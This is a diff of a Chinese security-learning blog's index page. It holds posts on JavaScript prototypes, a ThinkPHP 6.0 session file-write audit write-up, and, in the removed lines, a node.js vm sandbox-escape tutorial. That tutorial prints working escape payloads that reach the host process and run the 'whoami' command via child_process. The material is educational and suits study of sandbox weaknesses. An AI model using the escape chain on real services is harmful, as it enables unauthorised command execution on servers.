@@ -8,83 +8,7 @@
     noSupport: 'The browser does not support'
   },
   hexoVersion: '5.2.0'
-} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">109</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/%E8%AE%BAjs%E7%9A%84%E5%AF%B9%E8%B1%A1/">论js的对象</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现学习node.js的沙盒逃逸时，对象的概念也需要理解一下。</p>
-<h2 id="什么是js"><a href="#什么是js" class="headerlink" title="什么是js"></a>什么是js</h2><p>js就是javascript，js里面一切皆对象，理解对象是理解js语言的关键</p>
-<h2 id="封装、继承、多态"><a href="#封装、继承、多态" class="headerlink" title="封装、继承、多态"></a>封装、继承、多态</h2><p>在C++/Java等传统面向对象编程中，类（class）是对象（object）的模板，class不占用内存空间，object占用内存，object也称为class instance，同一个class可以被new出很多个object。</p>
-<p>Javascript语言不支持”类”，但Javascript仍然是面向对象语言，面向对象的3要素在JavaScript里都支持:</p>
-<ul>
-<li>封装 - 数据与方法封装在一起，方法可以操作数据，这就是JS里的object</li>
-<li>继承 - 新创建的对象可以继承父对象的数据和方法，js里有多种方法实现继承，譬如原型方式继承，拷贝继承等</li>
-<li>多态 - 一个接口有多种实现</li>
-</ul>
-<p>实际上，js里一切皆对象。</p>
-<h2 id="什么是对象"><a href="#什么是对象" class="headerlink" title="什么是对象"></a>什么是对象</h2><p>js里的对象（object）就是一组键值(name-value)的集合, name总是string类型, value可以是各种类型, 可以是基本数据类型, 可以是数组或其他对象, 也可以是函数, object很像是一个hash map. object里的name-value是无序的。</p>
-<p>对象是动态的，可以动态地增加属性和方法。</p>
-<h2 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a>对象属性</h2><h3 id="属性特性"><a href="#属性特性" class="headerlink" title="属性特性"></a>属性特性</h3><p>每个属性都拥有4个特性，数据属性和访问器属性一共有6种属性特性:</p>
-<ul>
-<li>数据属性特有的特性:<ul>
-<li><code>[[Value]]</code>: 属性的值.</li>
-<li><code>[[Writable]]</code>: 控制属性的值是否可以改变.</li>
-</ul>
-</li>
-<li>访问器属性特有的特性:<ul>
-<li><code>[[Get]]</code>: 存储着getter方法.</li>
-<li><code>[[Set]]</code>: 存储着setter方法.</li>
-</ul>
-</li>
-<li>两种属性都有的特性:<ul>
-<li><code>[[Enumerable]]</code>: 如果一个属性是不可枚举的,则在一些操作下,这个属性是不可见的,比如for…in和Object.keys()</li>
-<li><code>[[Configurable]]</code>: 如果一个属性是不可配置的,则该属性的所有特性(除了%%[[Value]]%%)都不可改变</li>
-</ul>
-</li>
-</ul>
-<h3 id="对象的原型-prototype"><a href="#对象的原型-prototype" class="headerlink" title="对象的原型[[prototype]]"></a>对象的原型[[prototype]]</h3><p>在js中所有对象都有一个隐含的属性<code>[[prototype]]</code>指向其原型对象，原型对象也有自己的原型，如此下去便形成一个原型链，所有对象的原型链的顶层都是Object.prototype.</p>
-<p>请注意，<code>[[prototype]]</code>并不是一个真实的属性名，因此无法通过这个属性名获得原型对象，但js提供了方法来读取和判断对象的原型:</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接前面的例子</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(myFather) === Person.prototype); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myFather)); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myMother)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
-
-<p>对象的原型链通常是只读的，用户无法修改某个对象的原型，所以无法修改对象的继承关系。</p>
-<h4 id="属性proto"><a href="#属性proto" class="headerlink" title="属性proto"></a>属性<strong>proto</strong></h4><p>在js规范里，对象原型通常是不可见的属性，因此无法直接访问。但某些浏览器里支持<code>__proto__</code>属性，firefox/chrome/safari/nodejs都支持<code>__proto__</code>属性，在这些浏览器里对象原型是可见的，可以直接访问对象的<code>__proto__</code>属性得到对象原型，也可以通过修改对象的<code>__proto__</code>属性来修改对象的原型链。</p>
-<p>ECMAScript 6正在讨论把<code>__proto__</code>属性标准化，但目前属性<code>__proto__</code>还不是标准。</p>
-<p>本文接下来提到的<code>__proto__</code>, <code>[[prototype]]</code>都是指一个意思，即自身对象里指向其原型对象的属性。</p>
-<h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>函数也是对象，所以函数也有属性<code>__proto__</code>，通过字面量声明的函数其原型对象是Function.prototype，当然Function.prototype的原型对象是Object.prototype.</p>
-<p>函数还有一个特有的属性<code>prototype</code>，每个函数都有一个prototype属性（特别注意，prototype属性是函数对象特有的属性，不要和js中每个对象到其原型的连接相混淆，那个是隐藏的，只是在firefox/chrome等浏览器中你可以使用<code>__proto__</code>访问到）</p>
-<h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><h6 id="Object-prototype-constructor"><a href="#Object-prototype-constructor" class="headerlink" title="Object.prototype.constructor"></a>Object.prototype.constructor</h6><p>返回创建实例对象的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 构造函数的引用。注意，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串。对原始类型来说，如<code>1</code>，<code>true</code>和<code>&quot;test&quot;</code>，该值只可读。</p>
-<h6 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h6><p>所有对象都会从它的原型上继承一个constructor属性:</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">o.constructor === <span class="built_in">Object</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.name=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> theTree=<span class="keyword">new</span> Tree(<span class="string">&quot;Redwood&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;theTree.constructor is &quot;</span>+the Tree.constructor);</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line">theTree.constructor is <span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大概整理一下js的对象的一些基础概念，<br>1.每个对象都有[[prototype]]属性，是用来指向自己的原型对象<br>2.所有对象的[[prototype]]是_proto_，而函数有一个特有的属性是prototype<br>3.prototype有个属性是constructor指向其原型对象的，可以进行调用。</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/node-js%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/">node.js沙盒逃逸分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在日常开发中，会在业务代码中直接使用eval/function/vm等功能，其中 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p>
-<h2 id="沙盒简介"><a href="#沙盒简介" class="headerlink" title="沙盒简介"></a>沙盒简介</h2><p>沙盒的特点在于很好的系统隔离性，在某种程度上，沙盒sandbox可以视为一个容器container，application运行在沙盒中，沙盒运行在windows操作系统上运行在沙盒中的application和沙盒外的application一样可以访问硬盘中的文件等资源。运行在沙盒中的application和沙盒外的application的主要区别在于：</p>
-<ol>
-<li><p>对于沙盒外的application而言，沙盒内的application是透明的（即不可见的）；</p>
-</li>
-<li><p>当沙盒内的application退出后，所做的<strong>更改将不会被保存</strong>。</p>
-</li>
-</ol>
-<p>一个很好的例子是：当沙盒内的application退出后，沙盒内的application已下载或“安装”的恶意软件都将被丢弃。</p>
-<p>总而言之，<strong>沙盒就是一个可以让你相对安全执行代码的环境</strong></p>
-<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>首先来一段沙盒逃逸的实例，直接进行分析：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ctx = &#123;&#125;;</span><br><span class="line">vm.runInNewContext(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>, ctx);<span class="comment">//vm.runInNewContext是编译和运行里面的javascript代码，其中的ctx似乎是可控的，而this指向了ctx</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Never gets executed.&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>以上事例大致可以拆分出:</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tmp=ctx.constructor<span class="comment">//object</span></span><br><span class="line">exec=tmp.constructor<span class="comment">//Function</span></span><br><span class="line">exec(<span class="string">&#x27;return Process&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>以上被称为原型链的方式完成逃逸，个人感觉可以和继承的思想联系在一起，有点类似但是又不同，<strong>大概是通过往前引用原型链，引用到沙箱外的函数，从而实现逃逸</strong>。</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210713120601.png" alt="img" style="zoom:50%;">
-根据这个图片进行讲解，就是在vm上下文通过原型链的prototype属性向上链接引用function，引用到全局数据实现在沙盒内进行沙盒外的function的调用。
-
-<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    animal: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">    count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`this`</span>);</span><br><span class="line">vm.createContext(context);</span><br><span class="line"><span class="keyword">var</span> result = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(result.Function == <span class="built_in">Function</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
-
-<p>其中<code>this</code>通过其__proto__属性指向的是主环境的Object.prototype，所以:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">this.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</span><br></pre></td></tr></table></figure>
-
-<p>1.通过this的原型链向上获得主环境的function<br>2.然后通过(‘return process’)()获得主环境process变量<br>3通过process.mainModule.require导入child_process模块，实现命令执行</p>
-<h3 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h3><p><strong>process变量：</strong>是nodejs中的一个全局变量，<br>拿到这个环境变量，相当于此时是在主环境下进行函数的执行，类似偷梁换柱？</p>
-<p><strong>child_process模块：</strong>提供了命令执行的方法</p>
-<p><a target="_blank" rel="noopener" href="http://nodejs.cn/api/child_process.html#child_process_child_process">http://nodejs.cn/api/child_process.html#child_process_child_process</a><br><a target="_blank" rel="noopener" href="https://chinese.freecodecamp.org/forum/t/topic/587">https://chinese.freecodecamp.org/forum/t/topic/587</a><br><a target="_blank" rel="noopener" href="https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/">https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/</a></p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/11/thinkphpv6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">thinkphpv6.0代码审计</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-11</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好做到一题thinkphp框架漏洞，于是决定自己审计一番~，正好学学如何入门</p>
+} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">110</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/15/thinkphpv6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">thinkphpv6.0代码审计</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-15</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好做到一题thinkphp框架漏洞，于是决定自己审计一番~，正好学学如何入门</p>
 <h2 id="代码审计两种方式"><a href="#代码审计两种方式" class="headerlink" title="代码审计两种方式"></a>代码审计两种方式</h2><p>1**.通读全文源码**<br>2.<strong>功能点审计</strong>：根据漏洞对应发生函数进行功能行审计，常会用到逆向溯源数据流方法进行审计<br>3.<strong>正向追踪数据流</strong>：根据用户输入参数-&gt;来到代码逻辑-&gt;最后审计代码逻辑缺陷-&gt;尝试构造payload<br>4.<strong>逆向溯源数据流</strong>:字符串搜索指定操作函数_跟踪函数可控参数-&gt;审计代码逻辑缺陷-&gt;尝试构造payload<br><strong>CMS可分为两大类</strong><br>单入口cms:不管访问哪个模块都使用同一个入口文件，常见的MVC框架采用这种模式<br>多入口cms:每个模块都有一个入口文件(可以前端设置一个入口文件 index.php，后端创建一个入口文件admin.php，前后端的入口文件是独立的)。</p>
 <h2 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h2><p>接下来我们从三个层次开始我们的源码审计思路</p>
 <p>1.确定要审计的源码是什么语言</p>
@@ -180,13 +104,112 @@
 <p>具体列表推荐：<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-error-reporting.html">https://www.runoob.com/php/func-error-reporting.html</a></p>
 <p>这里设置的作用是将错误级别调到最高,显示所有问题,方便环境部署时候排错。</p>
 </blockquote>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>think v6.0漏洞是session可控导致任意文件读取覆盖甚至getshell，所以我们直接去寻找session进行分析</p>
-<p>发现session直接由cookie赋值</p>
-<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210711110744.png" alt="img"></p>
-<p>没有经过任何过滤，仅仅是比对了一下长度是32位以及是否为字符串就对id进行赋值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210711111839.png" alt="img" style="zoom:67%;"></p>
-<p>PS:救命，已经绕晕在代码里面了<br>按照正常逻辑，接下来应该是对session的内容进行赋值等操作，所以我们定位一下session的相关函数去跟进一下:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210712152854.png" alt="img"></p>
-<p>发现写入操作<br>将sessionID写入data 跟进write方法，发现有writefile操作<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210712154646.png" alt="img" style="zoom:67%;"><br>发现使用了file_put_contents函数，其中可以看到path是可控的以及content也是可控的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210712154823.png" alt="img"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>不是很完整，因为环境还没有搭起来，所以很多函数的跳转没有实现，只能利用ctrl点击函数，查看他的来源</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>人生建议，一定要安装phpstudy的集成环境–<br>更改配置的根目录为www(5)的web目录<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210714205154.png" alt="img"><br>修改为www/web/目录打开即可，接下来去配置一下数据库<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210714205245.png" alt="img" style="zoom:67%;"></p>
+<p>去config中的database.php修改一下配置信息，然后去mysql中创建一下表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database ctf;</span><br></pre></td></tr></table></figure>
+
+<p>但是他的很多表和库的信息我们都不清楚–。。。。所以还是老老实实重新安装整个框架了。。<br><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a><br>这里降级的时候一直没弄好，不懂是为啥，用了其他的安装和降级指令才行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think tp60</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json里面的”topthink/frameword”为6.0.0</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140505.png" alt="img" style="zoom:67%;">
+去掉前面你的注释符，开启session
+然后更改apache的根目录为框架里面的public目录
+
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715134244.png" alt="img" style="zoom:67%;">
+创建成功：
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140701.png" alt="img" style="zoom: 33%;">
+果然最难的就是环境的配置--
+接下来修改一下:tp60\app\controller\的index.php文件使他可以创建session
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715140937.png" alt="img" style="zoom:67%;">
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据漏洞描述，是因为session可控，传入的session值最后会拼接在sess_后形成任意文件读取覆盖，所以这里我们就直接跟进session值的传入。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715155925.png" alt="img" style="zoom:67%;"><br>进入session.php观察如何进行文件写入</p>
+<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715161558.png" alt="img"><br>跟进以后发现无过滤，只要长度符合32位就对sessionID进行赋值<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715161834.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164037.png" alt="img"><br>接下来进行save()函数进行session的保存，可以看到write函数，将data写入sessionID中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715162555.png" alt="img"></p>
+<p>将sessionid和sess_进行拼接形成新的文件名存放在/runtime/session/路径中<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164437.png" alt="img" style="zoom:67%;"></p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164440.png" alt="img" style="zoom:67%;">
+
+<p>将传入的data值，写入改session文件中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164822.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715164821.png" alt="img" style="zoom:67%;"></p>
+<p>但是由于我网站根目录设置的是public，懒得再弄了，被配置环境弄怕了–<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715170513.png" alt="img" style="zoom:67%;"></p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210715170514.png" alt="img" style="zoom:50%;">
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啊 无语了，想说换成phpstudy继承的，但是发现没有适合的php版本于是就又换了回去，期间debug的更换配置也是让人很头疼，最后瞎配置 也总算是配置好了–，真的是有点傻了<br>说一下第一次审计的收获<br>1.使用ctrl加鼠标左键可以直接看该函数的出现的位置<br>2.可以右键单击某个值添加观察追踪其改变位置<br>3.根据出问题的功能追踪其功能</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/buuctf22/">buuctf22</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/13/%E8%AE%BAjs%E7%9A%84%E5%AF%B9%E8%B1%A1/">论js的对象</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-13</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现学习node.js的沙盒逃逸时，对象的概念也需要理解一下。</p>
+<h2 id="什么是js"><a href="#什么是js" class="headerlink" title="什么是js"></a>什么是js</h2><p>js就是javascript，js里面一切皆对象，理解对象是理解js语言的关键</p>
+<h2 id="封装、继承、多态"><a href="#封装、继承、多态" class="headerlink" title="封装、继承、多态"></a>封装、继承、多态</h2><p>在C++/Java等传统面向对象编程中，类（class）是对象（object）的模板，class不占用内存空间，object占用内存，object也称为class instance，同一个class可以被new出很多个object。</p>
+<p>Javascript语言不支持”类”，但Javascript仍然是面向对象语言，面向对象的3要素在JavaScript里都支持:</p>
+<ul>
+<li>封装 - 数据与方法封装在一起，方法可以操作数据，这就是JS里的object</li>
+<li>继承 - 新创建的对象可以继承父对象的数据和方法，js里有多种方法实现继承，譬如原型方式继承，拷贝继承等</li>
+<li>多态 - 一个接口有多种实现</li>
+</ul>
+<p>实际上，js里一切皆对象。</p>
+<h2 id="什么是对象"><a href="#什么是对象" class="headerlink" title="什么是对象"></a>什么是对象</h2><p>js里的对象（object）就是一组键值(name-value)的集合, name总是string类型, value可以是各种类型, 可以是基本数据类型, 可以是数组或其他对象, 也可以是函数, object很像是一个hash map. object里的name-value是无序的。</p>
+<p>对象是动态的，可以动态地增加属性和方法。</p>
+<h2 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a>对象属性</h2><h3 id="属性特性"><a href="#属性特性" class="headerlink" title="属性特性"></a>属性特性</h3><p>每个属性都拥有4个特性，数据属性和访问器属性一共有6种属性特性:</p>
+<ul>
+<li>数据属性特有的特性:<ul>
+<li><code>[[Value]]</code>: 属性的值.</li>
+<li><code>[[Writable]]</code>: 控制属性的值是否可以改变.</li>
+</ul>
+</li>
+<li>访问器属性特有的特性:<ul>
+<li><code>[[Get]]</code>: 存储着getter方法.</li>
+<li><code>[[Set]]</code>: 存储着setter方法.</li>
+</ul>
+</li>
+<li>两种属性都有的特性:<ul>
+<li><code>[[Enumerable]]</code>: 如果一个属性是不可枚举的,则在一些操作下,这个属性是不可见的,比如for…in和Object.keys()</li>
+<li><code>[[Configurable]]</code>: 如果一个属性是不可配置的,则该属性的所有特性(除了%%[[Value]]%%)都不可改变</li>
+</ul>
+</li>
+</ul>
+<h3 id="对象的原型-prototype"><a href="#对象的原型-prototype" class="headerlink" title="对象的原型[[prototype]]"></a>对象的原型[[prototype]]</h3><p>在js中所有对象都有一个隐含的属性<code>[[prototype]]</code>指向其原型对象，原型对象也有自己的原型，如此下去便形成一个原型链，所有对象的原型链的顶层都是Object.prototype.</p>
+<p>请注意，<code>[[prototype]]</code>并不是一个真实的属性名，因此无法通过这个属性名获得原型对象，但js提供了方法来读取和判断对象的原型:</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接前面的例子</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(myFather) === Person.prototype); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myFather)); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(myMother)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
+
+<p>对象的原型链通常是只读的，用户无法修改某个对象的原型，所以无法修改对象的继承关系。</p>
+<h4 id="属性proto"><a href="#属性proto" class="headerlink" title="属性proto"></a>属性<strong>proto</strong></h4><p>在js规范里，对象原型通常是不可见的属性，因此无法直接访问。但某些浏览器里支持<code>__proto__</code>属性，firefox/chrome/safari/nodejs都支持<code>__proto__</code>属性，在这些浏览器里对象原型是可见的，可以直接访问对象的<code>__proto__</code>属性得到对象原型，也可以通过修改对象的<code>__proto__</code>属性来修改对象的原型链。</p>
+<p>ECMAScript 6正在讨论把<code>__proto__</code>属性标准化，但目前属性<code>__proto__</code>还不是标准。</p>
+<p>本文接下来提到的<code>__proto__</code>, <code>[[prototype]]</code>都是指一个意思，即自身对象里指向其原型对象的属性。</p>
+<h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>函数也是对象，所以函数也有属性<code>__proto__</code>，通过字面量声明的函数其原型对象是Function.prototype，当然Function.prototype的原型对象是Object.prototype.</p>
+<p>函数还有一个特有的属性<code>prototype</code>，每个函数都有一个prototype属性（特别注意，prototype属性是函数对象特有的属性，不要和js中每个对象到其原型的连接相混淆，那个是隐藏的，只是在firefox/chrome等浏览器中你可以使用<code>__proto__</code>访问到）</p>
+<h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><h6 id="Object-prototype-constructor"><a href="#Object-prototype-constructor" class="headerlink" title="Object.prototype.constructor"></a>Object.prototype.constructor</h6><p>返回创建实例对象的 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 构造函数的引用。注意，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串。对原始类型来说，如<code>1</code>，<code>true</code>和<code>&quot;test&quot;</code>，该值只可读。</p>
+<h6 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h6><p>所有对象都会从它的原型上继承一个constructor属性:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">o.constructor === <span class="built_in">Object</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.name=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> theTree=<span class="keyword">new</span> Tree(<span class="string">&quot;Redwood&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;theTree.constructor is &quot;</span>+the Tree.constructor);</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line">theTree.constructor is <span class="function"><span class="keyword">function</span> <span class="title">Tree</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大概整理一下js的对象的一些基础概念，<br>1.每个对象都有[[prototype]]属性，是用来指向自己的原型对象<br>2.所有对象的[[prototype]]是_proto_，而函数有一个特有的属性是prototype<br>3.prototype有个属性是constructor指向其原型对象的，可以进行调用。</p>
